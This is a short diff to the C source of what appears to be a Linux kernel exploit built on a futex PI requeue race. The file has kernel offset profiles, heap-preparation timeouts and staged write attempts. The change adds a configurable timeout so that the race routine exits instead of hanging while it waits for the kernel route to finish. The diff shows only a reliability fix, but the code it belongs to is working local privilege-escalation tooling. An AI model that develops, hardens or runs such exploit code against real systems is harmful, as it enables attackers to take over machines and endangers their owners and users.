@@ -141,6 +141,7 @@ static int validate_offsets_profile(const struct kernel_offsets *entry) {
       e->recommended_main_cpu == e->recommended_consumer_cpu ||
       !e->heap_prepare_max_attempts || !e->heap_prepare_timeout_ms ||
       !e->heap_kernelsnitch_timeout_ms || !e->race_route_wait_ms ||
+      !e->race_route_done_timeout_ms ||
       !e->race_setup_settle_us || !e->race_state_poll_interval_us ||
       !e->w1_attempts || !e->w1_settle_us ||
       !e->w1_scratch_repair_attempts || !e->w2_attempts ||
@@ -176,6 +177,7 @@ static void log_execution_settings(const struct kernel_offsets *profile) {
   LOG_EXEC("heap.prepare_timeout_ms", e->heap_prepare_timeout_ms);
   LOG_EXEC("heap.kernelsnitch_timeout_ms", e->heap_kernelsnitch_timeout_ms);
   LOG_EXEC("race.route_wait_ms", e->race_route_wait_ms);
+  LOG_EXEC("race.route_done_timeout_ms", e->race_route_done_timeout_ms);
   LOG_EXEC("race.setup_settle_us", e->race_setup_settle_us);
   LOG_EXEC("race.state_poll_interval_us", e->race_state_poll_interval_us);
   LOG_EXEC("stages.w1_attempts", e->w1_attempts);
@@ -495,8 +497,30 @@ int pi_race_run(PiRaceContext *race) {
                      &race->target_futex, 0);
   pr_info("[route] CMP_REQUEUE_PI ret=%ld errno=%d; waiting route_done\n",
           rq, errno);
-  while (!atomic_load(&race->route_done))
+  struct timespec route_wait_started;
+  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &route_wait_started));
+  const uint64_t route_timeout_ns =
+      (uint64_t)execution_settings()->race_route_done_timeout_ms * 1000000ULL;
+  while (!atomic_load(&race->route_done)) {
     usleep(execution_settings()->race_state_poll_interval_us);
+    struct timespec now;
+    SYSCHK(clock_gettime(CLOCK_MONOTONIC, &now));
+    uint64_t elapsed_ns =
+        (uint64_t)(now.tv_sec - route_wait_started.tv_sec) * 1000000000ULL;
+    if (now.tv_nsec >= route_wait_started.tv_nsec) {
+      elapsed_ns += (uint64_t)(now.tv_nsec - route_wait_started.tv_nsec);
+    } else {
+      elapsed_ns -= (uint64_t)(route_wait_started.tv_nsec - now.tv_nsec);
+    }
+    if (elapsed_ns >= route_timeout_ns) {
+      /* PI ownership may still be held by a kernel route. Joining the worker
+       * here can deadlock forever, so fail-stop the native process and let the
+       * manager report a bounded route failure instead of hanging. */
+      pr_error("[route] route_done timeout after %u ms; fail-stopping\n",
+               execution_settings()->race_route_done_timeout_ms);
+      _exit(124);
+    }
+  }
   RouteStatus status = race->route_status;
   pr_info("[route] route_done status=%d clean=%d/%d step=%d errno=%d "
           "calls=%d success=%d\n", status.code, status.userspace_clean,
